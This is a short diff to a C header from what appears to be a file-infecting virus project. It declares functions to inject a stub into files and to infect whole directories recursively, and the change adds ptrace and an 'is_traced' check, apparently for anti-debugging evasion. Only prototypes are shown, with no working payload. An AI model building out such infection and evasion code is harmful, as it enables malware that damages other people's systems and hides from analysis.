@@ -16,9 +16,10 @@
 # include <unistd.h>
 # include <limits.h>
 # include "./m_std.h"
+# include <sys/ptrace.h>
+# include <stdio.h>
 
 # if DEBUG && !NOSTD
-#  include <stdio.h>
 #  define LOG(...) fprintf(stderr, __VA_ARGS__)
 # else
 #  define LOG(...) ((void)0)
@@ -79,5 +80,7 @@ void		inject_stub(t_famine *f, const unsigned char *stub, size_t stub_len, size_
 int			infect_file(const char *path, const unsigned char *stub, size_t stub_len, size_t placeholders_offset);
 
 void		infect_dir(const char *dir, const unsigned char *stub, size_t stub_len, size_t placeholders_offset, bool recursive);
+
+bool		is_traced(void);
 
 #endif
